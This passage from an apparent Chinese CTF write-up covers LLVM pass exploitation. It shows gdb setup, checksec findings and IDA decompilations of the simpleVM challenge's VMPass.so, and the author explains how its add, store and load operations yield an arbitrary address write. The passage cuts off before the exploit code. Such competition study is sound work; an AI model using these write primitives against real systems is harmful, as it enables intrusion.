apt install llvm-12</span><br></pre></td></tr></table></figure><p>其中<code>opt</code>是<code>LLVM</code>的优化器和分析器，可加载指定的模块，对输入的<code>LLVM IR</code>或者<code>LLVM</code>字节码进行优化或分析。<code>CTF</code>题目一般会给出所需版本的<code>opt</code>文件（可用<code>./opt --version</code>查看版本）或者在<code>README</code>文档中告知<code>opt</code>版本。安装好<code>llvm</code>后，可在<code>/usr/lib/llvm-xx/bin/opt</code>路径下找到对应<code>llvm</code>版本的<code>opt</code>文件（一般不开<code>PIE</code>保护）  </p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="[红帽杯 2021] simpleVM"></a>[红帽杯 2021] simpleVM</h2><p>好习惯，上来先给<code>opt-8</code>来一发<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="我的图图呢">  <p>可以发现程序并没有开启<code>PIE</code>保护而且<code>got</code>表可改<br>将<code>VMPass.so</code>拖进<code>ida</code>，漏洞通常都在这一个<code>so</code>文件中<br>我们首先看<code>start</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>PASS</code>注册名称为<code>VMPass</code>。我们尝试在<code>ida</code>中查找<code>runOnFunction</code>函数，结果发现这个函数的符号表给删了？图片中的<code>sub_6830</code>函数即为我们要找的<code>runOnFunction</code>函数函数  </p><img src="/2024/03/15/llvm/3.png" class="" title="我的图图呢">  <p>接下来分析一下<code>runOnFunction</code>函数  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改函数先通过<code>getName(a2)</code>来获取<code>.ll</code>文件中定义的函数名字，如果该函数的名字为<code>o0o0o0o0</code>，则会进入<code>sub_6AC0</code>这个函数进行进一步的处理<br>定位到关键函数<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里我们终于可以知道为什么题目的名字叫<code>simpleVM</code>了，这就是很经典的<code>VMpwn</code>，只不过和<code>llvm pass</code>相结合而已。这个函数实现了<code>push</code>、<code>pop</code>、<code>store</code>、<code>load</code>、<code>add</code>指令功能。为了方便看懂代码，这里先简单分析几个<code>llvm pass</code>中的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>获取函数的名字并赋值给<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>获取函数的一个参数并将其赋值给<code>v8</code><br>这里我选择使用<code>add</code>、<code>store</code>、<code>load</code>相互配合来实现任意地址写，下面给出关键代码片段  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span 